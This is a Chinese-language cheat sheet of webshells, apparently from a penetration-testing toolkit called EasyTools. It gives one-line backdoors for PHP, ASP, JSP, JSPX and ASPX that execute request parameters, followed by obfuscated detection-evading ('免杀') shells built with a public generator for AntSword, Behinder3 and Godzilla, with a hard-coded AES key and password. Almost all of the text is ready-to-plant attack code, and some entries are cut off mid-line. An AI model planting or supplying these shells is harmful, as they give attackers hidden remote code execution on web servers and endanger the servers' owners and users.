### PHP一句话
~~~ 

1. 基本的 eval 一句话木马
<?php @eval($_POST['EasyTools']); ?>
这是最常见的一句话木马，通过 POST 请求传递的 EasyTools 参数的内容会被 eval 函数执行。

2. 基本的 assert 一句话木马
<?php @assert($_POST['EasyTools']); ?>
这个木马使用 assert 函数，assert 可以直接执行传递的代码，如果 EasyTools 参数是一个有效的表达式，将被执行。

3. 基本的 system 一句话木马
<?php @system($_POST['EasyTools']); ?>
通过 POST 请求传递的 EasyTools 参数内容将通过 system 函数执行，这通常用于执行系统命令。

4. 基本的 preg_replace 一句话木马
<?php @preg_replace(\"/.*/e\", $_POST['EasyTools'], ''); ?>
这个木马利用了 preg_replace 的 /e 修饰符，可以将 EasyTools 参数中的内容当作 PHP 代码执行。需要注意的是，/e 修饰符在 PHP 7.0.0 中已被移除，因此这个木马在较新的 PHP 版本中不可用。

5. 基本的 create_function 一句话木马
<?php @create_function('', $_POST['EasyTools'])(); ?>
这个木马使用 create_function 创建一个匿名函数，并立即执行 EasyTools 参数中的内容。

6. 基本的 include 一句话木马
<?php @include($_POST['file']); ?>

7. 其他php一句话木马
<?php $a = base64_decode(\"YXNzZXJ0\");$a($_POST['EasyTools']); ?>

<?php class me{public $a = ''; function __destruct(){assert(\"$this->a\"); }}$obj = new me;$obj->a = $_POST['EasyTools']; ?>

<?php $a = $_POST['haha'];if(isset($a)){@preg_replace(\"/\\[(.*)\\]/e\",'\\\\1','[@eval(base64_decode($_POST[z0]));]');} 
~~~  

### ASP一句话木马

~~~ 

1. ASP 经典版一句话木马
<%eval request(\"EasyTools\")%>
这个一句话木马最为经典，EasyTools 是密码参数，可以通过 HTTP 请求发送对应的代码执行。

2. ASP 带有字符编码的一句话木马
<%eval request(\"EasyTools\"), \"VBScript\"%>
这个版本明确指定了使用 VBScript 作为脚本语言，进一步提高执行代码的准确性。

3. ASP 混淆版一句话木马
<%execute request(\"EasyTools\")%>
这个版本将关键字 eval 换成 execute，而将参数名改为 EasyTools，用于增加一些混淆。

4. ASP 隐藏版一句话木马
<%eval request(\"EasyTools\")%><html><!-- anything here --></html>
在一句话木马后加入一些 HTML 标签，使得代码更为隐蔽，不易被检测到。

5. ASP 文件包含一句话木马
<!--#include file=\"shell.asp\"-->
这个一句话木马用于文件包含漏洞，可以通过包含外部的 ASP 文件来执行代码。

6. ASP Hex编码一句话木马
<%execute(ChrW(\u0026H25766C63)\u0026request(\"EasyTools\"))%>
这个版本使用十六进制编码字符以规避检测，将 eval 通过 ChrW 生成。

7. ASP Base64 编码的一句话木马
<%
Dim shell
Set shell=Server.CreateObject(\"WScript.Shell\")
shell.Run \"cmd.exe /c \" \u0026 request(\"EasyTools\"), 0, 
~~~
### JSP一句话木马
~~~ 

1. 基本的 Runtime.getRuntime().exec() 一句话木马
<% Runtime.getRuntime().exec(request.getParameter(\"EasyTools\")); %>
通过 GET 请求传递的 cmd 参数的内容将作为系统命令执行。

2. 基本的 ProcessBuilder 一句话木马
<%
    ProcessBuilder pb = new ProcessBuilder(request.getParameter(\"EasyTools\").split(\" \"));
    pb.start();
%>
使用 ProcessBuilder 来执行传递的 cmd 参数内容，支持更复杂的命令执行。

3. 基本的 javax.script.ScriptEngineManager 一句话木马
<%
    javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager();
    javax.script.ScriptEngine engine = manager.getEngineByName(\"JavaScript\");
    engine.eval(request.getParameter(\"EasyTools\"));
%>
这个木马使用 javax.script.ScriptEngineManager 执行传递的 code 参数中的 JavaScript 代码。

4. 基本的 expression 一句话木马
<%= request.getParameter(\"EasyTools\") %>
直接输出 cmd 参数的内容，如果该内容是有效的 JSP 代码片段，将被执行。

5. 基本的 FileOutputStream 一句话木马
<%
    String filename = application.getRealPath(\"/\") + \"/shell.jsp\";
    String content = request.getParameter(\"EasyTools\");
    java.io.FileOutputStream fos = new java.io.FileOutputStream(filename);
    fos.write(content.getBytes());
    fos.close();
%>
通过 POST 请求传递的 code 参数内容会被写入到服务器的文件系统中，生成一个新的 JSP 文件。

6. 基本的 HttpServletResponse.getWriter() 一句话木马
<%
    response.getWriter().println(request.getParameter(\"EasyTools\"));
%>
将传递的 cmd 参数内容直接输出到 HTTP 响应中，如果内容是有效的 JSP 
~~~
### JSPX一句话木马
~~~ 

1. 基本的 Runtime.getRuntime().exec() 一句话木马
<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>
<jsp:scriptlet>
    Runtime.getRuntime().exec(request.getParameter(\"EasyTools\"));
</jsp:scriptlet>
通过 GET 请求传递的 cmd 参数将作为系统命令执行。

2. 基本的 ProcessBuilder 一句话木马
<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>
<jsp:scriptlet>
    ProcessBuilder pb = new ProcessBuilder(request.getParameter(\"EasyTools\").split(\" \"));
    pb.start();
</jsp:scriptlet>
使用 ProcessBuilder 来执行传递的 cmd 参数内容，支持更复杂的命令执行。

3. 基本的 javax.script.ScriptEngineManager 一句话木马
<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>
<jsp:scriptlet>
    javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager();
    javax.script.ScriptEngine engine = manager.getEngineByName(\"JavaScript\");
    engine.eval(request.getParameter(\"EasyTools\"));
</jsp:scriptlet>
使用 javax.script.ScriptEngineManager 执行传递的 code 参数中的 JavaScript 代码。

4. 基本的 expression 一句话木马
<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>
<jsp:expression>
    request.getParameter(\"EasyTools\")
</jsp:expression>
直接输出 cmd 参数的内容，如果该内容是有效的 JSP 代码片段，将被执行。

5. 基本的 FileOutputStream 一句话木马
<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>
<jsp:scriptlet>
    String filename = application.getRealPath(\"/\") + \"/shell.jsp\";
    String content = request.getParameter(\"EasyTools\");
    java.io.FileOutputStream fos = new java.io.FileOutputStream(filename);
    fos.write(content.getBytes());
    fos.close();
</jsp:scriptlet>
通过 POST 请求传递的 code 参数内容会被写入到服务器的文件系统中，生成一个新的 JSP 文件。

6. 基本的 HttpServletResponse.getWriter() 一句话木马
<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>
<jsp:scriptlet>
    response.getWriter().println(request.getParameter(\"EasyTools\"));
</jsp:scriptlet>
将传递的 cmd 参数内容直接输出到 HTTP 响应中，如果内容是有效的 JSP 
~~~
### ASPX一句话木马
~~~ 

1. 基本的 Process.Start 一句话木马
<%@ Page Language=\"C#\" %>
<% 
    System.Diagnostics.Process.Start(Request[\"EasyTools\"]); 
%>
通过 GET 请求传递的 cmd 参数将作为系统命令执行。

2. 基本的 Response.Write 一句话木马
<%@ Page Language=\"C#\" %>
<% 
    Response.Write(Request[\"EasyTools\"]);
%>
将传递的 cmd 参数内容直接输出到 HTTP 响应中，如果内容是有效的 ASPX 代码片段，可能会在浏览器中直接执行。

3. 基本的 Eval 一句话木马
<%@ Page Language=\"C#\" %>
<% 
    Eval(Request[\"EasyTools\"]); 
%>
使用 Eval 方法执行传递的 cmd 参数内容。注意，这种方法不常见，因为 Eval 通常用于数据绑定，但在某些情况下可以用来执行代码。

4. 基本的 Reflection 一句话木马
<%@ Page Language=\"C#\" %>
<%@ Import Namespace=\"System.Reflection\" %>
<% 
    Type type = Type.GetType(\"System.Diagnostics.Process\");
    MethodInfo method = type.GetMethod(\"Start\", new Type[] { typeof(string) });
    method.Invoke(null, new object[] { Request[\"EasyTools\"] });
%>
通过反射机制，动态调用 System.Diagnostics.Process.Start 方法执行传递的 cmd 参数内容。

5. 基本的 File.WriteAllText 一句话木马
<%@ Page Language=\"C#\" %>
<%@ Import Namespace=\"System.IO\" %>
<% 
    File.WriteAllText(Server.MapPath(\"shell.aspx\"), Request[\"EasyTools\"]); 
%>
通过 POST 请求传递的 code 参数内容会被写入到服务器的文件系统中，生成一个新的 ASPX 文件。

6. 基本的 ScriptManager.RegisterStartupScript 一句话木马
<%@ Page Language=\"C#\" %>
<%@ Import Namespace=\"System.Web.UI\" %>
<% 
    ScriptManager.RegisterStartupScript(this, this.GetType(), \"script\", Request[\"EasyTools\"], true); 
%>
将传递的 cmd 参数内容作为 JavaScript 
~~~
### JSP-CMD免杀马
~~~ 

由 https://github.com/cseroad/Webshell_Generate 生成：
<%  String A7T01 = request.getParameter(\"EasyTools\");ProcessBuilder pb;if(String.valueOf(java.io.File.separatorChar).equals(\"\\\\\")){pb = new ProcessBuilder(new /*Z#￥h*u@!h1UEu1LxHM*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), A7T01);}else{pb = new ProcessBuilder/*Z#￥h*u@!h1UEu1LxHM*/(new/*Z#￥h*u@!h1UEu1LxHM*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), A7T01);}if (A7T01 != null) {Process process = pb.start();java.util.Scanner EZt73851 = new java.util.Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");String op=\"\";op = EZt73851.hasNext() ? EZt73851.next() : op;EZt73851.close();out.print(op);}else {} %>

返回404：
<%  String ADS0k = request.getParameter(\"EasyTools\");ProcessBuilder pb;if(String.valueOf(java.io.File.separatorChar).equals(\"\\\\\")){pb = new ProcessBuilder(new /*Z#￥h*u@!h7SO169vJK*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), ADS0k);}else{pb = new ProcessBuilder/*Z#￥h*u@!h7SO169vJK*/(new/*Z#￥h*u@!h7SO169vJK*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), ADS0k);}if (ADS0k != null) {Process process = pb.start();java.util.Scanner EKHa79c4 = new java.util.Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");String op=\"\";op = EKHa79c4.hasNext() ? EKHa79c4.next() : op;EKHa79c4.close();out.print(op);}else {response.sendError(404);} 
~~~
### JSP-CMD-Reflect
~~~ 

由https://github.com/cseroad/Webshell_Generate生成：
<%!public static String reverseStr(String str) { return new StringBuilder(str).reverse().toString(); } %><% String A09f6 = request.getParameter(\"EasyTools\"); if(A09f6!=null){Class<?> C144 = Class.forName(reverseStr(\"emitnuR.gnal.avaj\"));java.lang.reflect.Method E76wpX48 = C144.getMethod(reverseStr(\"cexe\"), String.class);Process GvS8Hy5Q = (Process)E76wpX48.invoke( C144.getMethod(reverseStr(\"emitnuRteg\")).invoke(null), A09f6);java.io.InputStream in = GvS8Hy5Q.getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"</pre>\");}else{} %>

返回404：
<%!public static String reverseStr(String str) { return new StringBuilder(str).reverse().toString(); } %><% String AXpGa = request.getParameter(\"EasyTools\"); if(AXpGa!=null){Class<?> CKb3 = Class.forName(reverseStr(\"emitnuR.gnal.avaj\"));java.lang.reflect.Method Ed0RcxK9 = CKb3.getMethod(reverseStr(\"cexe\"), String.class);Process GU97vC33 = (Process)Ed0RcxK9.invoke( CKb3.getMethod(reverseStr(\"emitnuRteg\")).invoke(null), AXpGa);java.io.InputStream in = GU97vC33.getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"</pre>\");}else{response.sendError(404);} 
~~~
### JSPX-CMD免杀
~~~ 

由https://github.com/cseroad/Webshell_Generate生成：
<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">
<pre><hi:scriptlet>
 String ANa9z = request.getParameter(\"EasyTools\");ProcessBuilder pb;if(String.valueOf(java.io.File.separatorChar).equals(\"\\\\\")){pb = new ProcessBuilder(new /*Z#￥h*u@!hH581T9389*/String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), ANa9z);}else{pb = new ProcessBuilder/*Z#￥h*u@!hH581T9389*/(new/*Z#￥h*u@!hH581T9389*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), ANa9z);}if (ANa9z != null) {Process process = pb.start();java.util.Scanner EutLIA6U = new java.util.Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");String op=\"\";op = EutLIA6U.hasNext() ? EutLIA6U.next() : op;EutLIA6U.close();out.print(op);}else 
~~~
### JSPX-CMD-Reflect
~~~ 

由https://github.com/cseroad/Webshell_Generate生成：
<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">
<hi:declaration> 
public static String reverseStr(String str) { return new StringBuilder(str).reverse().toString(); }</hi:declaration> 
<hi:scriptlet>
String A29Ms = request.getParameter(\"EasyTools\"); if(A29Ms!=null){Class C7i5 = Class.forName(reverseStr(\"emitnuR.gnal.avaj\"));java.lang.reflect.Method EC5y6uU2 = C7i5.getMethod(reverseStr(\"cexe\"), String.class);Process Gy946ue5 = (Process)EC5y6uU2.invoke( C7i5.getMethod(reverseStr(\"emitnuRteg\")).invoke(null), A29Ms);java.io.InputStream in = Gy946ue5.getInputStream(); java.util.Scanner scanner = new java.util.Scanner(in);StringBuilder result = new StringBuilder(); while (scanner.hasNextLine()) { result.append(scanner.nextLine()).append(\"\
\");} out.println(result.toString());in.close();scanner.close();}else 
~~~
### ASHX-CMD
~~~ 

由https://github.com/cseroad/Webshell_Generate生成：
<%@ WebHandler Language = \"CS\" Class=\"Handler3\" %>using System;using System.Collections.Generic; using System.Diagnostics;using System.Web;public class Handler3 : IHttpHandler { public void ProcessRequest (HttpContext context) { string BClfv3 = context.Request[\"EasyTools\"];System.Diagnostics.Process p = new System.Diagnostics.Process();/*Z#￥h*u@!hghmU9NU9u*/p.StartInfo./*Z#￥h*u@!hghmU9NU9u*/FileName = \"cmd.exe\";\t/*Z#￥h*u@!hghmU9NU9u*/p.StartInfo.UseShellExecute = false;/*Z#￥h*u@!hghmU9NU9u*/p.StartInfo.RedirectStandardInput = true;p.StartInfo.RedirectStandardOutput = true;p.StartInfo.RedirectStandardError = true;p.StartInfo.CreateNoWindow = true;p.Start();p.StandardInput.WriteLine(BClfv3);p.StandardInput.Close();context.Response.Write(p.StandardOutput.ReadToEnd());context.Response.End();}public bool IsReusable { get { return 
~~~
### AntSword各种免杀马
~~~ 

由https://github.com/cseroad/Webshell_Generate生成，默认密码EasyTools

🚀【PHP马】
<?php class G00KnK24 { public function __construct($Hj4HK){ @eval(\"/*Z#￥h*u@!h2248M4668*/\".$Hj4HK.\"/*Z#￥h*u@!h2248M4668*/\"); }}new G00KnK24($_REQUEST['EasyTools']);?>

🚀【JSP马】
<%  String H32u8 = request.getParameter(\"EasyTools\");if (H32u8 != null) { class Eb4S69j9 extends/*Z#￥h*u@!h111tJ4l00*/ClassLoader { Eb4S69j9(ClassLoader LNbQw2) { super(LNbQw2); } public Class H32u8(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \"\";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A63qC = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A63qC.getMethod(k, String.class).invoke(A63qC.newInstance(), H32u8);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H32u8);}Class aClass = new Eb4S69j9(Thread.currentThread().getContextClassLoader()).H32u8(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %>

🚀【JSPX马】
<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">
<hi:scriptlet>
 String H01d4 = request.getParameter(\"EasyTools\");if (H01d4 != null) { class EzW76434 extends/*Z#￥h*u@!hTSraS73b1*/ClassLoader { EzW76434(ClassLoader L4Y0Af) { super(L4Y0Af); } public Class H01d4(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \"\";for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A65r8 = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A65r8.getMethod(k, String.class).invoke(A65r8.newInstance(), H01d4);}catch (Exception e) {int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = \"\";for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);bytes = (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, H01d4);}Class aClass = new EzW76434(Thread.currentThread().getContextClassLoader()).H01d4(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {response.sendError(404);}</hi:scriptlet>
</hi>

🚀【ASP马】
<% 
<!--
Class CozM
    public property let SXEWH(DTJQ5he51)
    DTJQ5he51 = Left(DTJQ5he51, 9999)
    eXeCutE DTJQ5he51 REM IXMQD)
    end property
End Class

Set a= New CozM
a.SXEWH= request(\"EasyTools\")
-->
%>

🚀【ASPX马】
<% function EAmaO6Nh(){var GEPH=\"u\",AU12e=\"afe\",Cf0W=GEPH+\"ns\"+AU12e;return Cf0W;}var Fc4X36:String=Request[\"EasyTools\"];var Fc4X36 = Fc4X36.substring(0, 9999);~~~~eval/*Z#￥h*u@!h3286I8n92*/(Fc4X36,EAmaO6Nh());%><%@Page Language = 
~~~
### Behinder3各种免杀马
~~~ 

由https://github.com/cseroad/Webshell_Generate生成，默认密码EasyTools

🚀【PHP马】
<?php @error_reporting(0);session_start();$key=\"7d0f713061983844\";$_SESSION['k']=$key;$f='file'.'_get'.'_contents';$p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18).chr(12).chr(9).chr(8);$HT7I5=$f($p);if(!extension_loaded('openssl')){ $t=preg_filter('/+/','','base+64+_+deco+de');$HT7I5=$t($HT7I5.\"\");for($i=0;$i<strlen($HT7I5);$i++) { $new_key = $key[$i+1\u002615];$HT7I5[$i] = $HT7I5[$i] ^ $new_key;}\t}else{ $HT7I5=openssl_decrypt($HT7I5, \"AES128\", $key);}$arr=explode('|',$HT7I5);$func=$arr[0];$params=$arr[1];class G4B3H629{ public function /*Z#￥h*u@!hx107IzAue*/__invoke($p) {@eval(\"/*Z#￥h*u@!hx107IzAue*/\".$p.\"\");}}@call_user_func/*Z#￥h*u@!hx107IzAue*/(new G4B3H629(),$params);?>

🚀【JSP马】
<%! public byte[] AYH9B(String Strings,String k) throws Exception { javax.crypto.Cipher B9Uq51 = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");B9Uq51.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = \"\";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);bytes =  (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), Strings);}byte[] result = (byte[]) B9Uq51.getClass()./*Z#￥h*u@!h55ME798QT*/getDeclaredMethod/*Z#￥h*u@!h55ME798QT*/(\"doFinal\", new Class[]{byte[].class}).invoke(B9Uq51,new Object[]{bytes});return result;} %><%  try {  String K6kQ257 = \"7d0f713061983844\";  session.putValue(\"u\", K6kQ257);  byte[] I8hI2QE = AYH9B (request.getReader().readLine(),K6kQ257);  java./*Z#￥h*u@!h55ME798QT*/lang./*Z#￥h*u@!h55ME798QT*/reflect.Method AYH9B = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*Z#￥h*u@!h55ME798QT*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  AYH9B.setAccessible(true);  Class i = (Class)AYH9B.invoke(Thread.currentThread()./*Z#￥h*u@!h55ME798QT*/getContextClassLoader(), I8hI2QE , 0, I8hI2QE.length);  Object Q326 = i./*Z#￥h*u@!h55ME798QT*/newInstance();  Q326.equals(pageContext); } catch (Exception e) {} %>

🚀【JSPX马】
<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">
<hi:declaration> 
 public byte[] A1050(String Strings,String k) throws Exception { javax.crypto.Cipher B0Nn9A = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");B0Nn9A.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = \"\";for (int i = 0; i \u0026lt; aa.length; i++) { aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);bytes =  (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), Strings);}byte[] result = (byte[]) B0Nn9A.getClass()./*Z#￥h*u@!h51640UKME*/getDeclaredMethod/*Z#￥h*u@!h51640UKME*/(\"doFinal\", new Class[]{byte[].class}).invoke(B0Nn9A,new Object[]{bytes});return result;}</hi:declaration> 
<hi:scriptlet>
 try {  String K4A7i2J = \"7d0f713061983844\";  session.putValue(\"u\", K4A7i2J);  byte[] I4376Ga = A1050 (request.getReader().readLine(),K4A7i2J);  java./*Z#￥h*u@!h51640UKME*/lang./*Z#￥h*u@!h51640UKME*/reflect.Method A1050 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*Z#￥h*u@!h51640UKME*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  A1050.setAccessible(true);  Class i = (Class)A1050.invoke(Thread.currentThread()./*Z#￥h*u@!h51640UKME*/getContextClassLoader(), I4376Ga , 0, I4376Ga.length);  Object QF25 = i./*Z#￥h*u@!h51640UKME*/newInstance();  QF25.equals(/*Z#￥h*u@!h51640UKME*/pageContext); } catch (Exception e) {response.sendError(404);}</hi:scriptlet>
</hi>

🚀【ASP马】
<% 
<!-- 
Response.CharSet = \"UTF-8\" 
Bgl1Pt=\"7d0f713061983844\"  
Session(\"k\")=Bgl1Pt 
Coi6=Request.TotalBytes 
QNGSU=Request.BinaryRead(Coi6) 
For i=1 To Coi6 
LC7jZy=ascb(midb(QNGSU,i,1)) Xor Asc(Mid(Bgl1Pt,(i and 15)+1,1))  
VSRBJ=VSRBJ + Chr(LC7jZy) 
Next 
eXecUtE(VSRBJ)REM ) 
-->
%>

🚀【ASPX马】
<%try{Session.@Add(\"key\",\"7d0f713061983844\"); byte[] key = Encoding.Default.GetBytes(Session[0] + \"\"),content = Request.BinaryRead(Request.ContentLength);System.Security.Cryptography.RijndaelManaged B58526 = new System.Security.Cryptography.RijndaelManaged();System.Security.Cryptography.ICryptoTransform decryptor = B58526/*Z#￥h*u@!h29i85XPE0*/.CreateDecryptor(key, key);byte[] decryptContent = decryptor.TransformFinalBlock(content, 0, content.Length);@System.@Reflection.@Assembly.@Load(decryptContent)/*Z#￥h*u@!h29i85XPE0*/.@CreateInstance(\"U\")/**/.Equals(/*Z#￥h*u@!h29i85XPE0*/this)/*Z#￥h*u@!h29i85XPE0*/;}catch(System.Exception){}%><%@ Page Language = \"CS\" 
~~~

### Godzilla各种免杀马
~~~ 
由https://github.com/cseroad/Webshell_Generate生成，默认密码EasyTools

🚀【PHP马】
<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++) {$c = $K[$i+1\u00260xF];$D[$i] = $D[$i]^$c;}return $D;}$payloadName='loadVsS6';$key='7d0f713061983844';$pass='EasyTools';if (isset($_POST[$pass])){$bs = preg_replace('/\\*/', '', 'base*64*_deco*de');$p = $_POST[$pass];$data=encode($bs($p.\"\"),$key);if (isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if (strpos($payload,\"getBasicsInfo\")===false){$payload=encode($payload,$key);}class GH70y973{ public function __construct($payload) {@eval(\"/*Z86m634950*/\".$payload.\"\");}}new GH70y973($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if (strpos($data,\"getBasicsInfo\")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}

🚀【JSP马】
<%!public byte[] AK4qK(byte[] s, boolean m) {try {javax.crypto.Cipher B6UvD9 = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");B6UvD9.init(m ? 1 : 2,(javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(\"7d0f713061983844\".getBytes(), \"AES\"));byte[] result = (byte[]) B6UvD9.getClass().getDeclaredMethod(\"doFinal\", new Class[]{byte[].class}).invoke(B6UvD9, new Object[]{s});return result;} catch (Exception e) {return null;}} %><% try {byte[] C45j = new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream = request.getInputStream();int _num = 0;while ((_num += inputStream.read(C45j, _num, C45j.length)) < C45j.length) ;C45j = AK4qK(C45j, false);if (session.getAttribute(\"ti\") == null) {Class PB=Class.forName(\"com.sun.jmx.remote.util.OrderClassLoaders\");java.lang.reflect.Constructor c = PB.getDeclaredConstructor(new Class[]{ClassLoader.class,ClassLoader.class});c.setAccessible(true);Object d = c.newInstance(new Object[]{Thread.currentThread()./*Z#￥h*u@!h1l38m8K3O*/getContextClassLoader(),Thread.currentThread()./*Z#￥h*u@!h1l38m8K3O*/getContextClassLoader()});java.lang.reflect.Method FqptQ9 = PB.getSuperclass().getDeclaredMethod(\"defineClass\",new Class[]{byte[].class,int.class,int.class});FqptQ9.setAccessible(true);session.setAttribute(\"ti\", FqptQ9.invoke(d, new Object[]{C45j, 0, C45j.length}));} else {request.setAttribute(\"parameters\", C45j);java.io.ByteArrayOutputStream E618xXe8 = new java.io.ByteArrayOutputStream(); Object f = ((Class) session.getAttribute(\"ti\")).newInstance(); f.equals(E618xXe8);f.equals(pageContext);f.toString(); response.getOutputStream().write(AK4qK(E618xXe8.toByteArray(), true));}} catch (Exception e) {} %>

🚀【JSPX马】
<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">
<hi:declaration> 
public byte[] An3AW(byte[] s, boolean m) {try {javax.crypto.Cipher Bdytt5 = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");Bdytt5.init(m ? 1 : 2,(javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(\"7d0f713061983844\".getBytes(), \"AES\"));byte[] result = (byte[]) Bdytt5.getClass().getDeclaredMethod(\"doFinal\", new Class[]{byte[].class}).invoke(Bdytt5, new Object[]{s});return result;} catch (Exception e) {return null;}}</hi:declaration> 
<hi:scriptlet>
try {byte[] CT3i = new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream = request.getInputStream();int _num = 0;while ((_num += inputStream.read(CT3i, _num, CT3i.length)) \u0026lt; CT3i.length) ;CT3i = An3AW(CT3i, false);if (session.getAttribute(\"ti\") == null) {Class PB=Class.forName(\"com.sun.jmx.remote.util.OrderClassLoaders\");java.lang.reflect.Constructor c = PB.getDeclaredConstructor(new Class[]{ClassLoader.class,ClassLoader.class});c.setAccessible(true);Object d = c.newInstance(new Object[]{Thread.currentThread()./*Z#￥h*u@!h7c0f6dV5I*/getContextClassLoader(),Thread.currentThread()./*Z#￥h*u@!h7c0f6dV5I*/getContextClassLoader()});java.lang.reflect.Method F3W22a = PB.getSuperclass().getDeclaredMethod(\"defineClass\",new Class[]{byte[].class,int.class,int.class});F3W22a.setAccessible(true);session.setAttribute(\"ti\", F3W22a.invoke(d, new Object[]{CT3i, 0, CT3i.length}));} else {request.setAttribute(\"parameters\", CT3i);java.io.ByteArrayOutputStream ErL717RQ = new java.io.ByteArrayOutputStream(); Object f = ((Class) session.getAttribute(\"ti\")).newInstance(); f.equals(ErL717RQ);f.equals(pageContext);f.toString(); 